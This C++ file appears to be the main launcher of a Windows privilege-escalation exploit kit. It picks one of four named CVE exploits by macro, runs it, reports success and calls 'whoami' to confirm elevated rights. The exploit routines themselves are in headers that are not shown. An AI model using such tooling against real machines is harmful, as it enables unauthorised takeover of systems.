// exp_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include "CVE-2016-3309.h"
#include "CVE-2019-1458.h"
#include "CVE-2020-1054.h"
#include "CVE-2018-8453.h"

#define VUL_NAME "CVE-2018-8453"

int main()
{
	BOOL bSucc = FALSE;

	if (strcmp(VUL_NAME, "CVE-2016-3309") == 0)
	{
		bSucc = Exploit_CVE_2016_3309();
	}
	else if (strcmp(VUL_NAME, "CVE-2019-1458") == 0)
	{
		bSucc = Exploit_CVE_2019_1458();
	}
	else if (strcmp(VUL_NAME, "CVE-2020-1054") == 0)
	{
		bSucc = Exploit_CVE_2020_1054();
	}
	else if (strcmp(VUL_NAME, "CVE-2018-8453") == 0)
	{
		bSucc = Exploit_CVE_2018_8453();
	}

	if (bSucc)	printf("Exploit %s Success\n", VUL_NAME);
	else printf("Exploit %s Fail\n", VUL_NAME);

	system("whoami");
	system("pause");

    return 0;
}

